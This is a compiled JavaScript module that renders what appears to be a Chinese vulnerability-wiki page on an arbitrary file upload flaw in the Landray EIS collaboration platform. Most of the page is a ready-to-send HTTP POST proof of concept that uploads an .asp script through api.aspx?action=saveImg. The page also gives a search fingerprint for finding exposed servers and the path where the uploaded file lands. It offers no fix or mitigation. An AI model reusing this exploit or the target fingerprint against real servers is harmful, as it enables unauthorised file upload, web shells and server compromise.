import{_ as e}from"./plugin-vue_export-helper-c27b6911.js";import{o as i,c as a,e as n}from"./app-58e4a7d6.js";const t={},d=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>蓝凌EIS 智慧协同平台 api.aspx 文件存在任意文件上传漏洞，攻击者通过漏洞可以上传任意文件</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><p>蓝凌EIS 智慧协同平台</p><h2 id="网络测绘" tabindex="-1"><a class="header-anchor" href="#网络测绘" aria-hidden="true">#</a> 网络测绘</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>icon_hash=&quot;953405444&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>登陆页面</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231116141557650.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>poc</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Length: 219
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynUqjgvhmkL1dxpCV
Upgrade-Insecure-Requests: 1

------WebKitFormBoundarynUqjgvhmkL1dxpCV
Content-Disposition: form-data; name=&quot;file&quot;filename=&quot;test.asp&quot;
Content-Type: text/html

&lt;% response.write(&quot;Test&quot;)%&gt;
------WebKitFormBoundarynUqjgvhmkL1dxpCV--
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231116141617020.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>/files/editor_img/xxx/xxx.asp
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,13),s=[d];function r(l,c){return i(),a("div",null,s)}const m=e(t,[["render",r],["__file","蓝凌EIS 智慧协同平台 api.aspx 任意文件上传漏洞.html.vue"]]);export{m as default};
